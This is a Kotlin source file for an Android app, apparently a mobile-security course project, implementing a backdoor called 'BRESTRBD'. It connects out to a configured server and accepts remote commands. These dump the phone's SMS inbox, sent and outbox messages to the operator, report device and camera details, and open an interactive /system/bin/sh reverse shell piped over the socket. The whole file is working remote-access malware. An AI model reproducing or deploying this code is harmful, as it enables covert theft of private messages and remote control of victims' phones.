package mobilesecurity.sit.project.mainpage.mainpage_backend

import android.content.Context
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Build
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.IOException
import java.io.InputStreamReader
import java.net.Socket
import java.util.Date


class ServerConnection(private val context: Context) : Runnable {
    private val host = UserSettings.SERVER_ADDRESS
    private val port = UserSettings.CONNECTION_PORT
    private val shPath = UserSettings.STORAGE_PATH


    override fun run() {
        connectForSync(host, port)
    }

    private fun connectForSync(host: String, port: Int) {
        var run = true
        try {
            Socket(host, port).use { socket ->
                println("Connected to $host:$port")
                DataOutputStream(socket.getOutputStream()).use { toServer ->
                    BufferedReader(InputStreamReader(socket.getInputStream())).use { fromServer ->
                        toServer.writeBytes("""
                        |-----------------------------HELLO, WELCOME TO BRESTRBD------------------------------
                        |
                        |  ____  _____  ______  _____ _______ _____  ____  _____  
                        | |  _ \|  __ \|  ____|/ ____|__   __|  __ \|  _ \|  __ \ 
                        | | |_) | |__) | |__  | (___    | |  | |__) | |_) | |  | |
                        | |  _ <|  _  /|  __|  \___ \   | |  |  _  /|  _ <| |  | |
                        | | |_) | | \ \| |____ ____) |  | |  | | \ \| |_) | |__| |
                        | |____/|_|  \_\______|_____/   |_|  |_|  \_\____/|_____/ 
                        |
                        |--------------------------------------COMMANDS-------------------------------------
                        | dumpMessages : This will dump all the SMS from the device to your terminal
                        | deviceInfo : This will get the device build information
                        | shell : This will get the Shell of the Android Device
                        | cameraInfo : This wil get the camera information
                        | bye : To exit the initial shell
                        """.trimMargin())
                        while (run) {
                            val command = fromServer.readLine()
                            println(command)
                            when {
                                command.equals("bye", ignoreCase = true) -> run = false
                                command.equals("shell", ignoreCase = true) -> {
                                    toServer.writeBytes("-----------------------------STARTING SHELL------------------------------ \n")
                                    startConnection(shPath, socket)
                                }
                                command.startsWith("dumpMessages") -> handleDumpMessages(command, toServer)
                                command.equals("deviceInfo", ignoreCase = true) -> toServer.writeBytes(deviceInfo())
                                command.equals("cameraInfo", ignoreCase = true) -> {
                                    val cameraInfo = getNumberOfCameras(context) ?: "Camera information not available"
                                    toServer.write(cameraInfo.toByteArray(Charsets.UTF_8))
                                    toServer.flush()
                                    toServer.write("END123\n".toByteArray(Charsets.UTF_8))
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun handleDumpMessages(command: String, toServer: DataOutputStream) {
        val box = when (command) {
            "1" -> "inbox"
            "2" -> "sent"
            "3" -> "outbox"
            else -> ""
        }
        toServer.writeBytes("[>] SMS $box:\r\n" + readSMSBox(box))
    }

    private fun getNumberOfCameras(context: Context): String? {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraDetails = StringBuilder()
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val facing = cameraManager.getCameraCharacteristics(cameraId)
                    .get(CameraCharacteristics.LENS_FACING)
                if (facing != null) {
                    when (facing) {
                        CameraCharacteristics.LENS_FACING_FRONT -> cameraDetails.append(cameraId)
                            .append(" --  Front Camera\n")

                        CameraCharacteristics.LENS_FACING_BACK -> cameraDetails.append(cameraId)
                            .append(" --  Back Camera\n")

                        CameraCharacteristics.LENS_FACING_EXTERNAL -> cameraDetails.append(cameraId)
                            .append(" --  External Camera\n")
                    }
                }
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
            return "Failed to access camera information."
        }
        return cameraDetails.toString()
    }


    private fun readSMSBox(box: String): String {
        val smsUri = Uri.parse(UserSettings.DATA_SOURCE_URI + box)
        var sms = ""
        context.contentResolver.query(smsUri, null, null, null, null)?.use { cursor ->
            while (cursor.moveToNext()) {
                val number = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                val date = Date(cursor.getLong(cursor.getColumnIndexOrThrow("date")) * 1000).toString()
                val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                sms += "[$number:$date]$body\n"
            }
        }
        return sms.ifEmpty { "No messages." }
    }

    private fun deviceInfo(): String {
        return """
            --------------------------------------------
            Manufacturer: ${Build.MANUFACTURER}
            Version/Release: ${Build.VERSION.RELEASE}
            Product: ${Build.PRODUCT}
            Model: ${Build.MODEL}
            Brand: ${Build.BRAND}
            Device: ${Build.DEVICE}
            Host: ${Build.HOST}
            --------------------------------------------
        """.trimIndent()
    }

    private fun startConnection(shPath: String, socket: Socket) {
        try {
            val process = ProcessBuilder("/system/bin/sh", "-i").redirectErrorStream(true).start()

            val processOutput = process.inputStream
            val processInput = process.outputStream
            val socketOutput = DataOutputStream(socket.getOutputStream())
            val socketInput = socket.getInputStream()

            // Thread to handle the process output
            Thread {
                processOutput.bufferedReader().forEachLine {
                    socketOutput.writeBytes(it + "\n")
                    socketOutput.flush()
                }
            }.start()

            // Thread to handle the socket input
            Thread {
                socketInput.bufferedReader().forEachLine {
                    processInput.write((it + "\n").toByteArray())
                    processInput.flush()
                }
            }.start()

            process.waitFor() // Wait for the process to finish

        } catch (e: IOException) {
            println("Failed to start shell: $e")
        }
    }



}
